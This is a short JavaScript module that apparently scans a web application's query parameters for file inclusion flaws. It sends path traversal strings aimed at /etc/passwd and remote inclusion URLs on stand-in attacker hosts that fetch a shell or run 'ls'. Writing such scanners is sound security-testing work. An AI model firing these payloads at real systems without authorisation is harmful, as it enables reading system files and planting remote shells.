const axios = require('axios');

const lfiPayloads = [
  '../../etc/passwd',
  '../../../../etc/passwd',
  '../../../../../etc/passwd',
  '/etc/passwd',
  '../../../../../../../../../../etc/passwd'
];

const rfiPayloads = [
  'http://evil.com/shell.txt',
  'https://attacker.com/malicious.php',
  'http://evil.com/malicious?cmd=ls'
];

async function testInclusion(url, params, authParams) {
  const results = {};

  const testPayloads = async (payloads, payloadType) => {
    for (const param in params) {
      results[param] = results[param] || [];
      
      for (const payload of payloads) {
        const testParams = { ...params, [param]: payload };
        try {
          const response = await axios.get(url, { params: testParams, auth: authParams });

          if (response.data.includes('root:') || response.data.includes('bin/bash')) {
            results[param].push({ payload, type: payloadType, status: 'Possible Inclusion (Sensitive Data)' });
          } else if (response.status === 200) {
            results[param].push({ payload, type: payloadType, status: 'Possible Inclusion (Successful Response)' });
          }
        } catch (error) {
          results[param].push({ payload, type: payloadType, status: `Request failed: ${error.message}` });
        }
      }
    }
  };

  await testPayloads(lfiPayloads, 'LFI');
  await testPayloads(rfiPayloads, 'RFI');

  return results;
}

module.exports = testInclusion;
